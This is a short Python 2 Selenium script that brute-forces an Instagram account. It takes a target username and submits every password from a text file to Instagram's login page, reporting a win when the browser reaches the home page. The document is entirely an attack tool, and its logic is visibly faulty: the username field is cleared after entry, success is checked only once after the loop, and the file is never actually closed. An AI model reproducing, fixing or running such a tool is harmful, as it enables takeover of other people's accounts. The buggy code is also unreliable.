from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
username = raw_input("Username Please")
passwords = "passwords.txt"
driver = webdriver.Firefox()
driver.implicitly_wait(30)
print "You Will See In Your Browser If The Password Worked!"
print "Creat By R3wly"
    
fd = open(passwords,"rb")
password = fd.read()
password = password.split("\n")
print(password)
fd.close
     
    
for i in password:    
    print "try with pass:" + i
    driver.get("https://www.instagram.com/accounts/login/")
    driver.get_cookies()
    elem = driver.find_element_by_name("username")
    elem.send_keys(username)
    elem.clear()
    elem = driver.find_element_by_name("password")
    elem.send_keys(i)  
    elem.send_keys(Keys.RETURN)
    time.sleep(7)
    print driver.current_url
if driver.current_url == "https://www.instagram.com":
    print 'You Win'
    
    
else:
    print 'Wrong password'        

driver.refresh()


   
